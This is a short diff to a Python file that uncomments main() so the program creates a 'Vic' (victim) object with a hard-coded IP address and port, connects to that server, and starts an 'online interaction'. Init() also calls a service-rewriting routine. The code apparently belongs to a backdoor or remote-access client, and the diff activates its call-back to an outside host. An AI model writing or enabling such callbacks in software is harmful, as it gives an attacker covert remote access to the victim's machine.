@@ -140,13 +140,11 @@ def Init():
     Vic.rewrite_service_init()
 
 def main():
-    #choice = "online"  # "offline"
-    #victim = Vic('173.230.140.32', 999)
-
-    #victim.connect_to_server()
-
-    #if choice == "online":
-    #    victim.online_interaction()
+    choice = "online"  # "offline"
+    victim = Vic('173.230.140.32', 999)
+    victim.connect_to_server()
+    if choice == "online":
+        victim.online_interaction()
 
     return None
 
